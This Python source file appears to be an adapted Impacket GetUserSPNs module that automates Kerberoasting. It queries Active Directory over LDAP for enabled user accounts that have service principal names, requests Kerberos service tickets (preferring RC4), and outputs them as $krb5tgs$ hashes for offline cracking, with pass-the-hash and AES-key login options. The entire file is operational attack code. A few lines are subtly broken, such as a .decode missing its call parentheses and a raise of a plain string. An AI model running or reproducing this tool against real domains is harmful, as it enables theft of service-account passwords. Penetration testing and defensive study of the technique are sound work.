#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#     This module will try to find Service Principal Names that are associated with normal user account.
#     Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
#     will encrypt the ticket with the account the SPN is running under, this could be used for an offline
#     bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
#     This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#     https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#     Original idea of implementing this in Python belongs to @skelsec and his
#     https://github.com/skelsec/PyKerberoast project
#
#     This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
#     Also, disabled accounts won't be shown.
#
# ToDo:
#  [X] Add the capability for requesting TGS and output them in JtR/hashcat format
#  [X] Improve the search filter, we have to specify we don't want machine accounts in the answer
#      (play with userAccountControl)

import os
import sys
import traceback
import logging
from datetime import datetime
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder
import impacket
from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.krb5.kerberosv5 import KerberosError

class GetUserSPNs:
    def __init__(self, target, username, password, domain, baseDN=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = None
        self.__aesKey = ''
        self.__doKerberos = False
        self.__requestTGS = True
        self.__kdcHost = target
        self.__saveTGS = False
        self.__requestUser = None

        if baseDN == None:
            # Create the baseDN
            domainParts = self.__domain.split('.')
            self.baseDN = ''
            for i in domainParts:
                self.baseDN += 'dc=%s,' % i
            # Remove last ','
            self.baseDN = self.baseDN[:-1]
        else:
            self.baseDN = baseDN

    def getMachineName(self):
        if self.__kdcHost is not None:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__domain, self.__domain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise('Error while anonymous Logger into %s' % self.__domain)
        else:
            s.logoff()
        return s.getServerName()

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                compute_lmhash(self.__password),
                                                                compute_nthash(self.__password), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
            except Exception as e:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcHost)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash),
                                                                unhexlify(self.__nthash), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, domain, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        output = None
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
            #new_domain_hash(domain, None, username, entry.strip(), format='Kerberos 5 TGS-REP')
            if fd != None:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
            #new_domain_hash(domain, None, username, entry.strip(), format='Kerberos 5 TGS-REP')
            if fd != None:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
            #new_domain_hash(domain, None, username, entry.strip(), format='Kerberos 5 TGS-REP')
            if fd != None:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
            if fd != None:
                fd.write(entry+'\n')
        else:
            print('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if self.__saveTGS is True:
            # Save the ticket
            logging.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(tgs, oldSessionKey, sessionKey )
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                logging.error(str(e))

        return output

    def run(self):
        if self.__doKerberos:
            target = self.getMachineName()
        else:
            if self.__kdcHost is not None:
                target = self.__kdcHost
            else:
                target = self.__domain

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.baseDN, self.__kdcHost)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcHost)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.baseDN, self.__kdcHost)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcHost)
            else:
                raise

        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"

        if self.__requestUser is not None:
            searchFilter += '(sAMAccountName:=%s))' % self.__requestUser
        else:
            searchFilter += ')'

        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            elif type(e) == impacket.ldap.ldap.LDAPSearchError:
                raise
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon])
            except Exception as e:
                pass

        if len(answers)>0:
            for user in answers:
                spn = user[0]
                username = user[1]
                domain = ".".join([item.split('=', 1)[1] for item in user[2].split(',') if item.split('=', 1)[0] == 'DC']).lower()

            if self.__requestTGS is True or self.__requestUser is not None:
                # Let's get unique user names and a SPN to request a TGS for
                users = {}
                for user in answers:
                    domain = ".".join([item.split('=', 1)[1] for item in user[2].split(',') if item.split('=', 1)[0] == 'DC']).lower()
                    users["%s\\%s" % (domain, user[1])] = user[0]

                # Get a TGT for the current user
                try:
                    TGT = self.getTGT()
                except KerberosError:
                    logging.error('%s Error getting TGS: synchronise your computer clock with the DC' % ("smb://%s" % self.__kdcHost).ljust(30))
                    return
                if self.__outputFileName is not None:
                    fd = open(self.__outputFileName, 'w+')
                else:
                    fd = None
                for user, SPN in users.items():
                    domain = user.split('\\', 1)[0]
                    username = user.split('\\', 1)[1]
                    try:
                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain,
                                                                                self.__kdcHost,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
                        tgs = self.outputTGS(tgs, oldSessionKey, sessionKey, username, domain, SPN, fd)

                        yield {
                            'domain': domain,
                            'username': username,
                            'spn': SPN,
                            'tgs': tgs,
                        }
                    except Exception as e:
                        traceback.print_exc()
                if fd is not None:
                    fd.close()
